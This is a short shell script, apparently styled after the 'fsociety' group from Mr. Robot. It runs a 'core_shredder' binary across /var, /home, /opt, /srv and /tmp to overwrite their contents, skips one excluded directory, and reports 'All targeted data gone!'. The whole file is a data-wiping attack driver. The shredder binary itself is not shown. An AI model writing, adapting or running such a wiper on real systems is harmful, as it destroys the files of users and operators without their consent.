#! /usr/bin/sh

TARGET_DIRS="/var /home /opt /srv /tmp"
EXCLUDED_DIR="/fsociety"
SHREDDER_BIN="./tools/core_shredder"

if [ ! -f "$SHREDDER_BIN" ]; then
  echo "[!] Error: Couldn't find ($SHREDDER_BIN)!"
  exit 1
fi

for DIR in $TARGET_DIRS; do
  if [ -d "$DIR" ]; then
    echo "[*] Rewriting data in $DIR..."
    "$SHREDDER_BIN" "$DIR" "$EXCLUDED_DIR"
  fi
done

echo "[*] All targeted data gone!"
